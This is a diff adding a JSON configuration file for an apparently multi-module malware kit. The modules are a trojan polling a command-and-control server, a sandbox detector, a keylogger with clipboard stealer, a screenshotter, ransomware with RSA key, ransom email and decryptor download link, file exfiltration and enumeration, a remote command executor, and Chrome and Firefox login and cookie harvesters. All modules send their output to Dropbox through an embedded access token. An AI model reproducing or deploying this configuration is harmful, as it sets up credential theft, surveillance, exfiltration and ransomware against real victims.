@@ -1,0 +1,80 @@
+{
+	"Trojan": {
+		"c2_domain": "http://127.0.0.1:5000",
+		"c2_poll_interval_ms": 5000,
+		"c2_ping_interval_ms": 1000,
+		"command_max_age_ms": 5000
+	},
+	"SandboxDetector": {},
+	"DropboxKeylogger": {
+		"dropbox_token": "sl.Bc7V7yHKC66s3U24-ZHonfA5iwZENUm8qgbCk6JACN8N4v27yeWNEDyUR_NVVatJjH5X3krmUaKqYSV9vzzlzYmA10lRChIGzKoP583A3QbaL647J_GdzReUtx3qcz7YCZfNSi9H",
+		"output_dropbox_dirpath": "/Client/`hwid`/DropboxKeylogger",
+		"max_runtime_ms": 60000,
+		"window_check_interval_ms": 1000,
+		"exfiltration_interval_ms": 5000,
+		"exfiltration_max_threads": 4,
+		"exfiltration_retry_if_fail": true,
+		"enable_clipboard_stealer": true
+	},
+	"DropboxScreenshotter": {
+		"dropbox_token": "sl.Bc7V7yHKC66s3U24-ZHonfA5iwZENUm8qgbCk6JACN8N4v27yeWNEDyUR_NVVatJjH5X3krmUaKqYSV9vzzlzYmA10lRChIGzKoP583A3QbaL647J_GdzReUtx3qcz7YCZfNSi9H",
+		"output_dropbox_dirpath": "/Client/`hwid`/DropboxScreenshotter",
+		"max_runtime_ms": 20000,
+		"screenshot_interval_ms": 2000,
+		"image_format": "JPEG"
+	},
+	"DropboxRansomware": {
+		"dropbox_token": "sl.Bc7V7yHKC66s3U24-ZHonfA5iwZENUm8qgbCk6JACN8N4v27yeWNEDyUR_NVVatJjH5X3krmUaKqYSV9vzzlzYmA10lRChIGzKoP583A3QbaL647J_GdzReUtx3qcz7YCZfNSi9H",
+		"output_dropbox_dirpath": "/Client/`hwid`/DropboxRansomware",
+		"output_json_indent_level": 4,
+		"root_dirpath": "C:\\Users\\`victim_username`\\Desktop\\test_crypt",
+		"target_file_extensions": [".pdf", ".docx", ".jpg", ".txt"],
+		"email_address": "you-owe-me@kissmyass.com",
+		"decryptor_source_url": "https://dl.dropbox.com/s/p59ce4gvl3yfoho/decryptor_gui.exe?dl=0",
+		"decryptor_download_filepath": "C:\\Users\\`victim_username`\\Desktop\\exclusions\\DECRYPTOR.exe",
+		"b64_str_init_vector": "+UWZ/AV/gEBwxG6DPHbHvw==",
+		"b64_str_rsa_pubkey": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFuZjc1eVpReFZFcWdhMWdrb0U4dQpGaGNEWmw1Uy9PdHE2bFp4azZ1RkJBSDc4YS9JL1dvdnpvMTZES2ZiZkx1dDRBSmJ6dGpoR2tieDRkVHRpbFArCmk0WEFndnU1OURUb3Z5RE01WXpRMFNuQUtOK2xkNXFPYThoQlJBdGx5UHN0U2RuYjYrN0cyWVgyUEVrQ1dBRmMKL2lFZ1FTeG1SNXlkbzJZd2x4WmtKNkk4THcrY1BvVmRrYXBxUU9aNmMvMXJUMjI5YmFmL21lOHJCZWNuckdGcQptT05jSjJzMmF0aWJhUVo5VkF3aElnK0trZmYrTWdlTUc4dHJ6TS9RbVRDMlB0U29rT1djTEZLZnpaMmN3TUwzCmxNMVRSUVNoV1ZCV0ZOc1kxOXNickRBdFFmSUM5aisrVHpnazB4Z3pJYjQ0TXFxYzFJRDU2N2tlTGtVUGZPT2MKTHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t",
+		"ransom_message": "`hwid`\n`encrypted_file_extension`\n`decryptor_path`\n`init_vector`\n`email_address`\n`victim_username`",
+		"ransom_message_filepath": "C:\\Users\\`victim_username`\\Desktop\\README_RANSOM.txt"
+	},
+	"DropboxFileExfiltrator": {
+		"dropbox_token": "sl.Bc7V7yHKC66s3U24-ZHonfA5iwZENUm8qgbCk6JACN8N4v27yeWNEDyUR_NVVatJjH5X3krmUaKqYSV9vzzlzYmA10lRChIGzKoP583A3QbaL647J_GdzReUtx3qcz7YCZfNSi9H",
+		"output_dropbox_dirpath": "/Client/`hwid`/DropboxFileExfiltrator",
+		"root_dirpath": "C:\\Users\\`victim_username`\\Desktop",
+		"target_file_extensions": [".txt"],
+		"target_filepaths": [],
+		"target_dirpaths": [],
+		"output_zip_dirpath": "C:\\Users\\`victim_username`\\Desktop"
+	},
+	"DropboxFileEnumerator": {
+		"dropbox_token": "sl.Bc7V7yHKC66s3U24-ZHonfA5iwZENUm8qgbCk6JACN8N4v27yeWNEDyUR_NVVatJjH5X3krmUaKqYSV9vzzlzYmA10lRChIGzKoP583A3QbaL647J_GdzReUtx3qcz7YCZfNSi9H",
+		"output_dropbox_dirpath": "/Client/`hwid`/DropboxFileEnumerator",
+		"output_json_indent_level": 4,
+		"root_dirpath": "C:\\Users\\`victim_username`\\Desktop",
+		"target_file_extensions": [],
+		"enumerate_all": false
+	},
+	"DropboxCMDExecutor": {
+		"dropbox_token": "sl.Bc7V7yHKC66s3U24-ZHonfA5iwZENUm8qgbCk6JACN8N4v27yeWNEDyUR_NVVatJjH5X3krmUaKqYSV9vzzlzYmA10lRChIGzKoP583A3QbaL647J_GdzReUtx3qcz7YCZfNSi9H",
+		"output_dropbox_dirpath": "/Client/`hwid`/DropboxCMDExecutor",
+		"command": "echo you have been hacked"
+	},
+	"DropboxChromeLoginHarvester": {
+		"dropbox_token": "sl.Bc7V7yHKC66s3U24-ZHonfA5iwZENUm8qgbCk6JACN8N4v27yeWNEDyUR_NVVatJjH5X3krmUaKqYSV9vzzlzYmA10lRChIGzKoP583A3QbaL647J_GdzReUtx3qcz7YCZfNSi9H",
+		"output_dropbox_dirpath": "/Client/`hwid`/DropboxChromeLoginHarvester",
+		"output_json_indent_level": 4,
+		"copy_db_filepath": "C:\\Users\\`victim_username`\\Desktop\\dclh.sqlite3"
+	},
+	"DropboxChromeCookieHarvester": {
+		"dropbox_token": "sl.Bc7V7yHKC66s3U24-ZHonfA5iwZENUm8qgbCk6JACN8N4v27yeWNEDyUR_NVVatJjH5X3krmUaKqYSV9vzzlzYmA10lRChIGzKoP583A3QbaL647J_GdzReUtx3qcz7YCZfNSi9H",
+	    "output_dropbox_dirpath": "/Client/`hwid`/DropboxChromeCookieHarvester",
+		"output_json_indent_level": 4,
+		"copy_db_filepath": "C:\\Users\\`victim_username`\\Desktop\\dcch.sqlite3"
+	},
+	"DropboxFirefoxCookieHarvester": {
+		"dropbox_token": "sl.Bc7V7yHKC66s3U24-ZHonfA5iwZENUm8qgbCk6JACN8N4v27yeWNEDyUR_NVVatJjH5X3krmUaKqYSV9vzzlzYmA10lRChIGzKoP583A3QbaL647J_GdzReUtx3qcz7YCZfNSi9H",
+	    "output_dropbox_dirpath": "/Client/`hwid`/DropboxFirefoxCookieHarvester",
+		"output_json_indent_level": 4,
+		"copy_db_filepath": "C:\\Users\\`victim_username`\\Desktop\\dfch.sqlite3"
+	}
+}
